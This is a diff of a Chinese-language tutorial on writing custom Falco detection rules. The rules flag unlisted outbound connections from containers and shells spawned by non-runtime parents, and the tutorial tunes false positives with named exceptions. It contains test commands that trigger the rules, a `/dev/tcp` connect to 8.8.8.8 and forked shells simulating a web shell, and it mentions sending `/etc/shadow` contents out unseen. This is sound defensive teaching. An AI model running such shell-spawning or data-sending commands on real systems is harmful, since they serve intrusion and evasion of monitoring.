@@ -1,101 +1,22 @@
-# Day 4: Falco 自訂規則與誤報調校
+# Day 4: Falco 自訂規則——補上預設規則的空白，調校誤報並說出例外的代價
 
 ![Falco 官方標誌](../assets/logos/falco-icon-color.svg){ align=right width="95" }
 
-> Day 3 找到預設規則的兩個空白:它不管「這個容器沒連過的位址」,也抓不到「容器裡已經在跑的東西再開一個 shell」。今天用 `list`、`macro`、`rule` 三層結構把這兩個洞補起來——但寫出會報的規則只是前半場。後半場是誤報,以及調校誤報必須付出的偵測力。
+Day 3 留下兩個空白：從容器連 8.8.8.8，連線成功，預設規則一筆都沒報；容器裡已經在跑的程式再開一個 shell，預設規則也看不到。這一章自己寫兩條規則把它們補上。
 
-!!! abstract "你在課程的哪裡"
-    - **Day 3**:Falco 裝好了,讀得懂一條規則怎麼從 `condition` 收斂到 syscall 欄位,也知道預設 25 條規則的邊界在哪裡。
-    - **今天**:寫兩條規則補上那兩個邊界、刻意製造一次誤報並用 `exceptions` 調校、把告警經 Falcosidekick 送出節點。驗收是自訂規則命中、接收端用自己的日誌證明收到,以及調校前後的數字與代價都量得出來。
-    - **Day 5**:換 Tetragon 上場。Falco 這邊的基準就是「25 條預設加 2 條自訂」。
+規則寫好、也命中了，接下來的問題比較難處理。假設你的規則是「容器只准連允許清單上的位址」，而叢集裡有一顆什麼壞事都沒做的 pod，每 2 秒呼叫一次叢集內的服務。這條規則每分鐘會因為它報 180 筆告警。加上兩條例外，告警就歸零；可是同一個容器如果把 `/etc/shadow` 的內容塞進請求，送到同一個服務，規則一樣不會報。
 
-## 寫規則不難,難的是知道它會吵多大聲
+讀完這一章，遇到一條很吵的自訂規則時，你能找出誤報是從哪裡放大出來的；決定加一條例外之前，你能說出這條例外會讓哪些連線從此不被這條規則看見。
 
-今天的六個步驟裡,只有兩個在寫規則:
+## 開始之前
 
-| 步驟 | 做什麼 |
-|---|---|
-| 1 | 把規則交給 Falco,並確認它真的載進去了 |
-| 2 | 規則 A:補上「沒連過的對外連線」 |
-| 3 | 規則 B:補上「非執行期父行程開的 shell」 |
-| 4 | **刻意製造誤報,調校,然後把交出去的偵測力量出來** |
-| 5 | 把告警送出節點 |
-| 6 | 收工,並確認留給下一章的基準 |
+這一章接著 Day 3 的環境做：Falco 的 helm release `falco`（chart 9.1.0）、`ebpf-lab` namespace 裡的 `baseline-nginx`、Day 3 的 `falco-values.yaml` 與 `falco-alerts.sh` 都要還在。這一章寫的規則只看 `ebpf-lab` 這個 namespace。
 
-步驟 4 是今天真正的重心。一條規則在實驗室裡命中很容易——你知道要做什麼動作才會觸發。難的是把它放進一座有正常流量的叢集,而正常流量會做的事遠比寫規則的人想像的多。
+## 步驟 1：規則 A，只准連允許清單上的位址
 
-## 步驟 1: 把規則交給 Falco
+Day 3 的[「從容器連到沒連過的位址，Falco 沒報」](sprint2-day3-falco-basics.md#mine-4)試過：從 `baseline-nginx` 連 8.8.8.8:53，Falco 零告警。預設規則裡跟網路有關的幾條，描述的都是具體的攻擊手法，沒有一條在問「這個容器以前有沒有連過這裡」。Day 2 用 bpftrace 做的手工基線問的正是這件事：把容器平常連的位址記下來，多出一筆沒見過的，就請人判斷。
 
-### 交付路徑
-
-Helm chart 的 `customRules` 是一個 map:**key 是檔名、value 是檔案內容**。chart 用它生一個 ConfigMap,再掛進 pod 的 `/etc/falco/rules.d/`。
-
-規則不要貼進 values 的 YAML 字串裡,用 `--set-file` 從獨立檔案送:
-
-```bash
-helm upgrade falco falcosecurity/falco --version 9.1.0 -n falco \
-  -f falco-values.yaml \
-  --set-file 'customRules.custom-rules\.yaml'=custom-rules.yaml
-```
-
-好處很直接:**規則檔是一份獨立、可以單獨 lint、可以單獨 diff 的檔案**,不是 YAML 字串裡的縮排。檔名裡的點要跳脫(`custom-rules\.yaml`),否則 Helm 會把它當成兩層 key。
-
-套用之後長這樣:
-
-```console
-$ kubectl -n falco exec <falco-pod> -c falco -- ls -la /etc/falco/rules.d/
-lrwxrwxrwx  custom-rules.yaml -> ..data/custom-rules.yaml
-drwxr-xr-x  ..2026_08_06_11_08_32.3345389208
-lrwxrwxrwx  ..data -> ..2026_08_06_11_08_32.3345389208
-```
-
-那兩層 symlink 是 ConfigMap volume 的標準結構(用來做原子更新的),不是異常。
-
-### 三個位置,後面的覆蓋前面的
-
-```console
-$ kubectl -n falco exec <falco-pod> -c falco -- grep -A4 rules_files /etc/falco/falco.yaml
-rules_files:
-- /etc/falco/falco_rules.yaml
-- /etc/falco/falco_rules.local.yaml
-- /etc/falco/rules.d
-```
-
-| 位置 | 誰放的 | 用途 |
-|---|---|---|
-| `falco_rules.yaml` | init 容器從 OCI registry 拉的 | 預設 25 條,**不要手改**,下次拉新版就被蓋掉 |
-| `falco_rules.local.yaml` | 傳統上給人手動編輯的本機覆寫檔 | **這個映像裡根本沒有這個檔案**。Falco 對 `rules_files` 裡不存在的項目是靜靜跳過,不報錯 |
-| `rules.d/` | chart 的 `customRules` | 今天的規則在這裡,**最後被解析,所以贏** |
-
-「覆蓋」有三種寫法,這是規則語言裡最容易搞錯的地方:
-
-| 想做的事 | 寫法 | 效果 |
-|---|---|---|
-| 整條換掉 | `- rule: <同名>` 加完整欄位 | 後解析的完全取代先解析的 |
-| 只加條件或例外值 | `- rule: <同名>` 搭配 `override` 語法 | 條件用 `and` 串接,`exceptions` 的 `values` 併入既有的 |
-| 關掉一條 | `- rule: <同名>` 搭配 `enabled: false` | 保留定義但不比對 |
-
-今天兩條規則都是**新名字**,所以純粹是加法,預設 25 條一條都沒動。這是刻意的:Day 5 要拿 Tetragon 跟 Falco 對比,改動預設規則會讓對比失去基準。
-
-### 確認規則真的載進去了
-
-Falco 每一個規則檔都會在啟動日誌裡列一行,而且會講 schema 驗證結果:
-
-```console
-$ kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco | sed -n '/Loading rules from/,/syscall buffer/p'
-Loading rules from:
-   /etc/falco/falco_rules.yaml | schema validation: ok
-   /etc/falco/rules.d/custom-rules.yaml | schema validation: ok      ← 自訂規則在這裡
-The chosen syscall buffer dimension is: 8388608 bytes (8 MBs)
-```
-
-**這一行沒出現,規則就沒載到**——不管 `helm upgrade` 說了什麼。`helm` 只保證 ConfigMap 的內容被寫進去、pod 被重建;它對規則的內容一無所知。[地雷 2](#mine-2) 就是靠這條日誌抓到的。
-
-## 步驟 2: 規則 A——補上「沒連過的對外連線」
-
-[Day 3 的地雷 4](sprint2-day3-falco-basics.md#mine-4):預設 25 條裡跟網路有關的三條全在描述具體手法,沒有一條在管「這個容器以前沒連過這裡」,所以從容器連 8.8.8.8:53 是零告警,而 Day 2 的手工基線抓得到。
-
-今天把「基線」這個概念,用 Day 3 學到的三層結構寫出來:
+規則 A 把這份基線寫成 Falco 規則。`baseline-nginx` 唯一的上游是 1.1.1.1，所以允許清單只有這一項：
 
 ```bash
 cat > custom-rules.yaml <<'EOF'
@@ -132,44 +53,50 @@ cat > custom-rules.yaml <<'EOF'
 EOF
 ```
 
-三層各自的必要性,Day 3 講的是形狀,這裡講為什麼:
 
-- **`list` 是唯一會頻繁改的東西。** 應用多一個上游依賴,改的是 `items`,`macro` 與 `rule` 一個字不動。把 IP 直接寫進 `condition` 的規則,每次改都要重讀整條布林運算式。
-- **`macro` 讓 `condition` 讀起來像一句話。** `ebpf_lab_workload and container and connection_to_unlisted_peer` 這一行是**意圖**;`evt.rawres >= 0 or evt.res = EINPROGRESS` 這種東西是**實作**,該藏在 macro 裡。
-- **`rule` 只剩下三件事**:什麼情況、報什麼、多嚴重。
+Day 3 拆過這三層的形狀，這裡說每一層為什麼要分開：
 
-寫這條規則時最自然的念頭是直接複用預設的 `outbound` macro。**不要**,原因是[地雷 3](#mine-3)。
+- **`list` 是最常改的部分。** 應用多一個上游依賴，改的是 `items`，`macro` 與 `rule` 一個字都不用動。把 IP 直接寫進 `condition` 的規則，每次改都要重讀整條布林運算式。
+- **`macro` 讓 `condition` 讀起來像一句話。** `ebpf_lab_workload and container and connection_to_unlisted_peer` 這一行說的是要抓什麼；`evt.rawres >= 0 or evt.res = EINPROGRESS`（連線成功，或非阻塞連線正在建立中）這類細節收進 macro 裡。`fd.typechar = 4 or fd.typechar = 6` 是「這個 fd 是 IPv4 或 IPv6 的 socket」，把檔案、pipe 這類 fd 排除掉。
+- **`rule` 只剩三件事**：什麼情況、報什麼、多嚴重。
 
-### 命中
+`tags` 裡的 `mitre_command_and_control` 和 `T1071` 是 MITRE ATT&CK 的分類。MITRE ATT&CK 是一份公開的攻擊手法目錄，每種手法有一個編號，T1071 指「透過一般的應用層協定跟外部的控制端通訊」。預設規則也帶這類標籤，告警送到下游之後，可以照手法分類統計。
+
+### 為什麼不直接用預設的 `outbound` macro {#why-not-outbound}
+
+<span id="mine-3"></span>
+
+預設規則檔裡已經有一個叫 `outbound` 的 macro，看名字正好是規則 A 要的東西。先把它展開來看。這一章的指令裡，`<falco-pod>` 要換成任一顆 Falco pod 的名字，從這裡挑一個 `falco-` 開頭的：
 
 ```console
-$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok'
-connect-ok
+$ kubectl -n falco get pods -o wide
 ```
 
-```json
-{
-  "rule": "Unexpected outbound connection from lab workload",
-  "priority": "Warning",
-  "hostname": "<node-a>",
-  "tags": ["T1071","custom","mitre_command_and_control","network","sprint2_day4"],
-  "output_fields": {
-    "fd.sip": "8.8.8.8", "fd.sport": 53, "fd.l4proto": "tcp",
-    "proc.name": "bash",
-    "proc.cmdline": "bash -c exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok",
-    "container.id": "41ae0eb6f163", "container.name": "nginx",
-    "k8s.pod.name": "baseline-nginx", "k8s.ns.name": "ebpf-lab"
-  }
-}
+然後在那顆 pod 裡印出 `outbound`：
+
+```console
+$ kubectl -n falco exec <falco-pod> -c falco -- grep -A9 '^- macro: outbound$' /etc/falco/falco_rules.yaml
+- macro: outbound
+  condition: >
+    ((evt.type = connect or …) and
+     (fd.typechar = 4 or fd.typechar = 6) and
+     (fd.ip != "0.0.0.0" and fd.net != "127.0.0.0/8"
+      and not fd.snet in (rfc_1918_addresses)) and        ← 這一行
+     (evt.rawres >= 0 or evt.res = EINPROGRESS))
 ```
 
-**逐字就是 Day 3 那個零告警的動作。** Day 2 的產出是「連線清單多了一筆沒見過的位址,請人判斷」;今天的產出是一條具名、帶 MITRE T1071 分類、帶 pod 身分的 Warning。
 
-## 步驟 3: 規則 B——補上「非執行期父行程開的 shell」
+標了箭頭的那一行是 `not fd.snet in (rfc_1918_addresses)`：目的地在私有網段（RFC 1918 定義的 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16）就不算 outbound。本課的 AKS 叢集，Pod 位址在 10.244.0.0/16，Service 位址在 10.0.0.0/16，都是私有網段。所以這一行等於把 pod 對 pod、pod 對 Service、pod 對 CoreDNS 的流量全部排除。
 
-[Day 3 的地雷 6](sprint2-day3-falco-basics.md#mine-6):`Terminal shell in container` 要求 `container_entrypoint`(父行程是 runc、containerd-shim、conmon),所以只抓得到執行期直接生的第一層 shell。容器裡已經在跑的東西再開 shell,一筆都不報。
+預設規則要抓的是容器連到外面的可疑位址，排除內網說得通。規則 A 要抓的是容器連了沒連過的地方，叢集內的服務也包含在內：攻擊者拿下一個容器之後，往叢集內其他服務移動（橫向移動）也是要抓的行為。所以 `lab_outbound_connect` 照著 `outbound` 的寫法自己拼一份，刻意不放那一行。
 
-規則 B 是它的**完全補集**:同一組 shell 執行檔,父行程條件反過來。
+複用 `outbound` 會怎樣，到步驟 4 量完誤報就看得出來：那些誤報一筆都不會出現，叢集內的連線也一起看不到了。
+
+## 步驟 2：規則 B，抓容器裡的程式再開的 shell
+
+Day 3 的[「容器裡的程式再開 shell，`Terminal shell in container` 不報」](sprint2-day3-falco-basics.md#mine-6)：預設的 `Terminal shell in container` 要求 shell 的父行程是容器執行期（runc、containerd-shim、conmon 這類負責把容器跑起來的程式），所以只抓得到 `kubectl exec` 直接開的那一層 shell。容器裡已經在跑的程式再開 shell，一筆都不報。web shell 就是這種情況：攻擊者把一支程式放進網站，透過 HTTP 請求叫它執行指令，指令由網站程式開的 shell 去跑。
+
+規則 B 用同一組 shell 執行檔，把父行程的條件反過來：父行程**不是**容器執行期才報。`tags` 裡的 `mitre_execution`、`T1059` 一樣是 MITRE ATT&CK 的分類，T1059 指「用命令列直譯器（shell、腳本語言）執行指令」。
 
 ```bash
 cat >> custom-rules.yaml <<'EOF'
@@ -201,180 +128,19 @@ cat >> custom-rules.yaml <<'EOF'
 EOF
 ```
 
-兩個設計決定要講清楚:
 
-- **`condition` 裡沒有 `proc.tty != 0`。** 預設規則有這一項,而它正是 [Day 3 地雷 3](sprint2-day3-falco-basics.md#mine-3) 的成因。web shell **沒有終端機**,加了 tty 條件就等於把要抓的目標排除掉。代價是這條規則也會抓到沒有終端機的自動化行為。
-- **`proc.pname exists` 不能省。** `container_entrypoint` 的第一項就是 `not proc.pname exists`(父行程可能已經先退出);如果不要求父行程存在,那些父行程為空的事件會落進 `not container_runtime_parent` 而被誤判成非執行期。
+有兩個地方跟預設規則刻意不同：
 
-### 驗證要用 `&` fork,不是巢狀 `bash -c`
+- **`condition` 裡沒有 `proc.tty != 0`。** 預設規則有這一項，所以沒有終端機的 shell 它不報（Day 3 的[「用 `kubectl exec -t` 開 shell，Falco 沒報」](sprint2-day3-falco-basics.md#mine-3)）。web shell 沒有終端機，加了這個條件，等於把要抓的對象排除掉。代價是規則 B 也會報沒有終端機的自動化腳本。
+- **`proc.pname exists` 不能省。** 父行程可能先退出，這時 `proc.pname` 是空的。`container_entrypoint` 的第一項就是處理這種情況的 `not proc.pname exists`；規則 B 如果不要求父行程存在，父行程為空的事件會落進 `not container_runtime_parent`，被誤判成「父行程不是容器執行期」。
 
-[Day 3 的地雷 6](sprint2-day3-falco-basics.md#mine-6) 記了一個假動作:用巢狀 `bash -c '<單一指令>'` 驗證會得到「兩筆都報」的假答案,因為 bash 的 implicit exec 讓內層**取代**外層而不是 fork。要真的 fork 得加 `&`:
+## 步驟 3：把規則交給 Falco，同時打開告警出口
 
-```console
-$ script -q /dev/null kubectl -n ebpf-lab exec -it baseline-nginx -- \
-      bash -c 'bash -c "echo forked-shell-ran" & wait; echo done'
-forked-shell-ran
-done
-```
+### 先準備接收告警的地方
 
-同一次動作、兩次 `bash` 的 `execve`、**兩條規則各抓一半**:
+到目前為止，Falco 的告警只寫在 pod 的標準輸出裡，`falco-alerts.sh` 就是從那裡撈。實際使用時，告警要送到聊天頻道、呼叫器或日誌平台。Falco 官方負責轉送的元件叫 **Falcosidekick**：它接收 Falco 送來的告警，再依設定轉送出去，一份輸入可以同時送到好幾個目的地。
 
-| 規則 | `proc.name` | `proc.pname` | `proc.tty` |
-|---|---|---|---|
-| `Terminal shell in container`(預設) | bash | **containerd-shim** | 34816 |
-| `Shell spawned by non-runtime parent in container`(自訂) | bash | **bash** | 34816 |
-
-預設規則抓到第一層,自訂規則抓到被 fork 出來的第二層。Day 3 那個「2 次 `execve`、1 筆告警」的缺口補起來了。
-
-### 更接近真實的版本:沒有終端機的 web shell
-
-上面那次因為包了 `script(1)`,fork 出來的 shell 繼承了 pty。真正的 web shell 不會有終端機。把 `script` 與 `-it` 拿掉再做一次:
-
-```console
-$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'bash -c "echo webshell-no-tty" & wait; echo done'
-webshell-no-tty
-done
-
-$ ./falco-alerts.sh --since 15s
-Shell spawned by non-runtime parent in container   proc=bash pname=bash tty=0   cmd=bash -c echo webshell-no-tty
---- 預設規則: 0 筆 ---
-```
-
-**預設規則這次連第一層都沒報**——沒有 tty,`proc.tty != 0` 不成立(Day 3 地雷 3);第二層又卡在 `container_entrypoint`(Day 3 地雷 6)。**兩顆地雷疊在一起,就是 Falco 對「腳本化的入侵」完全靜音。** 自訂規則報了,而且 `tty=0` 這個值本身就是它跟真人 `kubectl exec -it` 的區分訊號。
-
-這一段也順手回答了「規則 B 該不該加 tty 條件」:**加了就等於重新造一次 Day 3 的地雷 3。**
-
-## 步驟 4: 誤報,以及為誤報付的帳
-
-規則 A 的第一版是能用的,也是**錯的**——它把「不在清單上的對端」等同於「可疑」,而 Kubernetes 裡一個正常 pod 每天要連的東西遠比開發者想的多。
-
-### 刻意製造誤報
-
-部署一顆什麼壞事都沒做的 pod:解析一個叢集內 Service 名稱、GET 它、睡 2 秒、重複。
-
-```bash
-cat > legit-client.yaml <<'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: legit-client
-  namespace: ebpf-lab
-spec:
-  containers:
-    - name: client
-      image: mcr.microsoft.com/mirror/docker/library/python:3.11-slim
-      command: ["python3", "-u", "-c"]
-      args:
-        - |
-          import time, urllib.request
-          while True:
-              try:
-                  urllib.request.urlopen(
-                      "http://webhook-receiver.falco.svc.cluster.local:8080/ping").read()
-              except Exception as exc:
-                  print("request failed:", exc, flush=True)
-              time.sleep(2)
-      resources:
-        requests:
-          cpu: 10m
-          memory: 32Mi
-EOF
-kubectl apply -f legit-client.yaml
-```
-
-一顆每 2 秒發一次請求的 pod,也就是每分鐘 30 次。量測告警率:
-
-```console
-$ ./alert-rate.sh 120
-window start 2026-08-06T11:10:51Z, 120s
-window end   2026-08-06T11:12:51Z
---- 360 alert(s) in 120s = 180.0 alerts/min
-   360  Unexpected outbound connection from lab workload
-```
-
-**180 alerts/min。** 30 次請求對上 180 筆告警,六倍——原因是[地雷 4](#mine-4)。
-
-量測腳本要注意窗口怎麼劃:
-
-```bash
-cat > alert-rate.sh <<'EOF'
-#!/usr/bin/env bash
-# Count Falco alerts inside a fixed window, using each alert's own timestamp.
-# kubectl --since is evaluated per pod, so two Falco pods would use skewed windows.
-set -euo pipefail
-SECS="${1:-120}"
-START=$(date -u -v-"${SECS}"S +%Y-%m-%dT%H:%M:%SZ 2>/dev/null \
-        || date -u -d "-${SECS} seconds" +%Y-%m-%dT%H:%M:%SZ)
-END=$(date -u +%Y-%m-%dT%H:%M:%SZ)
-echo "window start $START, ${SECS}s"; echo "window end   $END"
-LINES=$(kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco \
-          --since="$((SECS + 30))s" --prefix=false 2>/dev/null | grep '"rule"' || true)
-IN=$(echo "$LINES" | awk -v s="$START" -v e="$END" \
-      'match($0,/"time":"[^"]*"/){t=substr($0,RSTART+8,RLENGTH-9); if(t>=s&&t<=e) print}')
-N=$(echo "$IN" | grep -c . || true)
-echo "--- $N alert(s) in ${SECS}s = $(echo "scale=1; $N*60/$SECS" | bc) alerts/min"
-echo "$IN" | sed -n 's/.*"rule":"\([^"]*\)".*/\1/p' | sort | uniq -c | sort -rn
-EOF
-chmod +x alert-rate.sh
-```
-
-### 用 `exceptions` 調校,而不是在 `condition` 尾巴接 `and not`
-
-Falco 的 `exceptions` 是規則的一等公民欄位。Falco 會替每個區塊在 `condition` 後面自動接一段 `and not (<fields> <comps> <values>)`。
-
-```yaml
-- rule: Unexpected outbound connection from lab workload
-  # …condition / output / priority 不變…
-  exceptions:
-    - name: cluster_dns_resolution
-      fields: [fd.sip, fd.sport, fd.l4proto]
-      comps: [=, =, =]
-      values:
-        - ["10.0.0.10", 53, udp]
-    - name: known_internal_services
-      fields: [fd.sip, fd.sport, fd.l4proto]
-      comps: [=, =, =]
-      values:
-        - ["10.0.47.134", 8080, tcp]
-```
-
-效果跟直接在 `condition` 尾巴接 `and not (fd.sip = "10.0.0.10" and …)` 一樣。差別全都在**維護**上:
-
-| | 塞進 `condition` | 用 `exceptions` |
-|---|---|---|
-| **具名** | 沒有名字。半年後看到 `and not (fd.sip="10.0.0.10" …)`,沒人知道為什麼加、誰加的 | `name: cluster_dns_resolution` 就是理由,稽核時可以逐條問「這條還需要嗎」 |
-| **可追加** | 要新增一個豁免對端,必須編輯原檔、改動那條布林運算式 | 官方的覆寫語法可以只追加 `values`,原規則檔一個字不動 |
-| **可審查** | diff 是「一行超長條件變成另一行更長的條件」 | diff 是「某個具名例外多了一列 values」,審查的人一眼看得出豁免範圍擴大了多少 |
-| **結構化** | 純文字 | `fields`／`comps`／`values` 有結構,可以用程式檢查(例如禁止任何例外拿整段 CIDR 當值) |
-
-第二列在多團隊的叢集裡是決定性的:**平台團隊維護規則,應用團隊只追加自己的豁免。**
-
-### 調校後
-
-```console
-$ ./alert-rate.sh 120
-window start 2026-08-06T11:16:11Z, 120s
-window end   2026-08-06T11:18:11Z
---- 0 alert(s) in 120s = 0.0 alerts/min
-```
-
-`legit-client` 全程還在跑,流量一模一樣。而真正的偏離照樣報:
-
-| | 調校前 | 調校後 |
-|---|---|---|
-| `legit-client` 正常流量 | **180.0 alerts/min** | **0.0 alerts/min** |
-| 連 8.8.8.8:53(真偏離) | 命中 | **命中** |
-| fork shell(規則 B) | 命中 | **命中** |
-
-看起來是完美的調校。它不是——代價見[地雷 5](#mine-5),而且那個代價是量得出來的。
-
-## 步驟 5: 把告警送出節點
-
-到目前為止告警只在 Falco 的標準輸出裡。要送出去,官方的元件是 Falcosidekick:一份輸入、扇出到數十種目的地。
-
-### 接收端放在叢集內
-
-**不接任何外部目的地、不放任何憑證**——Slack、Teams、PagerDuty、SMTP 全部需要 token 或密碼,而範例設定不放真實憑證。所以接收端是一顆自己寫的 python `http.server`,做兩件事:回 200、把收到的 JSON 印到自己的標準輸出。
+聊天頻道、呼叫器這類目的地都需要 token 或密碼，教材不放憑證，所以這裡的目的地是叢集內一顆自己寫的接收端：一個 python `http.server`，收到 POST 就回 200，並把收到的 JSON 印到自己的標準輸出。先把它建起來，Falcosidekick 一啟動就有地方送，步驟 4 的測試 pod 也會連它：
 
 ```bash
 cat > webhook-receiver.yaml <<'EOF'
@@ -449,14 +215,16 @@ EOF
 kubectl apply -f webhook-receiver.yaml
 ```
 
-### 打開路由
+
+### 在 values 裡打開 Falcosidekick
+
+在 Day 3 的 `falco-values.yaml` 後面加上這一段：
 
 ```yaml
 falcosidekick:
   enabled: true
   webui:
     enabled: false
-  # The chart ships no resources block at all — see mine 6.
   resources:
     requests: { cpu: 20m, memory: 32Mi }
     limits:   { cpu: 200m, memory: 128Mi }
@@ -467,18 +235,388 @@ falcosidekick:
       minimumpriority: "notice"
 ```
 
-`falcosidekick.enabled=true` 一開,chart 會自動把 Falco 的 `http_output` 指到 sidekick 的 Service,**不需要自己改 Falco 的設定**。Falco 的標準輸出也照樣寫,所以 Day 3 的 `falco-alerts.sh` 完全不用改。
 
-**Web UI 需要 Redis,這裡跳過**:`falcosidekick.webui` 會另外拉一個 Redis Deployment 加一個 UI Deployment。在一座 system 節點 CPU 已配置九成以上的叢集上([Day 3 地雷 1](sprint2-day3-falco-basics.md#mine-1)),為了「可以在瀏覽器上翻告警列表」多兩顆 pod,今天沒有任何步驟需要它。這是取捨,不是能力限制。
+`falcosidekick.enabled: true` 打開之後，chart 會自動把 Falco 的 `http_output`（Falco 用 HTTP 往外送告警的輸出）指到 sidekick 的 Service，不必另外改 Falco 的設定。Falco 的標準輸出照樣寫，所以 `falco-alerts.sh` 不用改。
 
-### 證據只採信接收端自己的日誌
+另外幾個值：
+
+- `webui.enabled: false`：sidekick 的 Web UI 會另外部署一個 Redis 和一個 UI 服務，用途是在瀏覽器上翻告警列表。這一章沒有步驟用得到，所以關掉，少兩顆 pod。
+- `resources`：chart 預設完全沒有給，後果見[疑難排解：sidekick 預設兩份副本、不給 resources](#mine-6)。
+- `minimumpriority: "notice"`：只把 notice 以上的告警送到這個 webhook，每個目的地可以各自設門檻。本課的實驗沒有產生低於 notice 的事件，所以門檻有沒有擋下低等級的告警，沒有實際驗證。
+
+### 一次 `helm upgrade` 交出規則和設定
+
+Falco 的 chart 用 `customRules` 接收自訂規則。它是一個 map：key 是檔名，value 是檔案內容。chart 把它做成一個 ConfigMap，掛進 pod 的 `/etc/falco/rules.d/`。規則不要貼進 values 的 YAML 字串裡，用 `--set-file` 從獨立的檔案送：
+
+```bash
+helm upgrade falco falcosecurity/falco --version 9.1.0 -n falco \
+  -f falco-values.yaml \
+  --set-file 'customRules.custom-rules\.yaml'=custom-rules.yaml
+```
+
+
+這樣規則檔是一份獨立的檔案，可以單獨檢查語法、單獨看 diff。檔名裡的點要跳脫（`custom-rules\.yaml`），否則 Helm 會把它當成兩層 key。
+
+這次升級改到了規則的 ConfigMap，Falco 的 DaemonSet 會一個節點接一個節點重啟，每個節點重啟期間有幾十秒沒有監控。之後每次改規則都會這樣，原因見[疑難排解：只改規則內容，整個 DaemonSet 也重啟一遍](#mine-1)。
+
+升級完成後，進 Falco 的 pod 看規則檔：
+
+```console
+$ kubectl -n falco exec <falco-pod> -c falco -- ls -la /etc/falco/rules.d/
+lrwxrwxrwx  custom-rules.yaml -> ..data/custom-rules.yaml
+drwxr-xr-x  ..2026_08_06_11_08_32.3345389208
+lrwxrwxrwx  ..data -> ..2026_08_06_11_08_32.3345389208
+```
+
+
+`custom-rules.yaml` 指向 `..data/`，`..data` 再指向一個帶時間戳的目錄。這兩層 symlink 是 ConfigMap 掛成 volume 時的標準結構，更新時 Kubernetes 一次換掉整個目錄，Falco 不會讀到改到一半的檔案。
+
+Falco 從哪些位置讀規則，寫在 `falco.yaml` 的 `rules_files`：
+
+```console
+$ kubectl -n falco exec <falco-pod> -c falco -- grep -A4 rules_files /etc/falco/falco.yaml
+rules_files:
+- /etc/falco/falco_rules.yaml
+- /etc/falco/falco_rules.local.yaml
+- /etc/falco/rules.d
+```
+
+
+| 位置 | 誰放的 | 說明 |
+|---|---|---|
+| `falco_rules.yaml` | init 容器在 pod 啟動時下載（規則檔跟容器映像一樣放在 OCI registry 上，用同一套格式發佈） | 預設的 25 條。不要手改，下次拉新版就被蓋掉 |
+| `falco_rules.local.yaml` | 傳統上留給人手動編輯的本機覆寫檔 | 這個映像裡沒有這個檔案。`rules_files` 裡不存在的項目，Falco 直接跳過，不報錯 |
+| `rules.d/` | chart 的 `customRules` | 這一章的規則在這裡 |
+
+清單由上往下解析，名字重複時，後解析的會蓋過先解析的。規則 A、B 都是新的名字，跟預設規則沒有重名，所以預設的 25 條一條都沒被動到。Day 5 要拿 Tetragon 跟 Falco 對照，預設規則保持原樣，對照才有共同的基準。
+
+### 確認規則真的載入了
+
+`helm upgrade` 成功，只代表 ConfigMap 寫進去了、pod 重建了；helm 不會檢查規則的內容。規則有沒有載入，要看 Falco pod 自己的啟動日誌。每個規則檔會列一行，附上 schema 驗證的結果：
+
+```console
+$ kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco | sed -n '/Loading rules from/,/syscall buffer/p'
+Loading rules from:
+   /etc/falco/falco_rules.yaml | schema validation: ok
+   /etc/falco/rules.d/custom-rules.yaml | schema validation: ok      ← 自訂規則在這裡
+The chosen syscall buffer dimension is: 8388608 bytes (8 MBs)
+```
+
+
+`custom-rules.yaml` 那一行要在，而且下面直接接 `The chosen syscall buffer dimension`，中間不能夾著 warning 區塊。如果看到 `Ok, with warnings`，規則可能載入了卻永遠不會觸發，見[疑難排解：`evt.dir` 已經淘汰，規則照樣載入成功](#mine-2)。
+
+### 告警現在怎麼走
+
+把這次升級之後的告警路徑畫出來，左邊是三個節點上的 Falco，右邊是接收端：
+
+![三個節點上各有一份 Falco，告警都送到同一個 Falcosidekick（Deployment），再由它 POST 到 webhook-receiver；證據 1、2 在 sidekick 的日誌，證據 3 在接收端自己的日誌](../assets/diagrams/s2d4-alert-path.svg)
+
+圖上有兩點跟後面的步驟有關：
+
+1. Falco 是 DaemonSet，每個節點一份。某個節點的 Falco 出問題，只影響那一個節點。
+2. Falcosidekick 是 Deployment，所有節點的告警都經過它。sidekick 停了，Falco 照樣偵測、DaemonSet 照樣顯示健康，卻沒有任何告警送得出去。
+
+圖上標的證據 1、2、3，步驟 7 會一一去查。
+
+## 步驟 4：放一顆正常的 pod 進來
+
+規則 A 把「不在清單上的對端」都當成可疑。叢集裡一顆正常的 pod 平常要連的東西，比寫規則時想到的多。先放一顆什麼壞事都沒做的 pod 進去：它解析叢集內的服務名稱、GET 步驟 3 建的接收端、睡 2 秒，一直重複。
+
+這顆 pod 引起的告警就是**誤報**（false positive）：規則報了，但它要抓的事並沒有發生。
+
+```bash
+cat > legit-client.yaml <<'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: legit-client
+  namespace: ebpf-lab
+spec:
+  containers:
+    - name: client
+      image: mcr.microsoft.com/mirror/docker/library/python:3.11-slim
+      command: ["python3", "-u", "-c"]
+      args:
+        - |
+          import time, urllib.request
+          while True:
+              try:
+                  urllib.request.urlopen(
+                      "http://webhook-receiver.falco.svc.cluster.local:8080/ping").read()
+              except Exception as exc:
+                  print("request failed:", exc, flush=True)
+              time.sleep(2)
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+EOF
+kubectl apply -f legit-client.yaml
+```
+
+
+量告警率之前，先準備一支量測腳本。它用每一筆告警自己的時間戳劃出固定長度的窗口，再按規則名稱分組計數。沒有直接用 `kubectl logs --since`，是因為 `--since` 對每顆 pod 各自計算，幾顆 Falco 的窗口會錯開：
+
+```bash
+cat > alert-rate.sh <<'EOF'
+#!/usr/bin/env bash
+# Count Falco alerts inside a fixed window, using each alert's own timestamp.
+# kubectl --since is evaluated per pod, so two Falco pods would use skewed windows.
+set -euo pipefail
+SECS="${1:-120}"
+START=$(date -u -v-"${SECS}"S +%Y-%m-%dT%H:%M:%SZ 2>/dev/null \
+        || date -u -d "-${SECS} seconds" +%Y-%m-%dT%H:%M:%SZ)
+END=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+echo "window start $START, ${SECS}s"; echo "window end   $END"
+LINES=$(kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco \
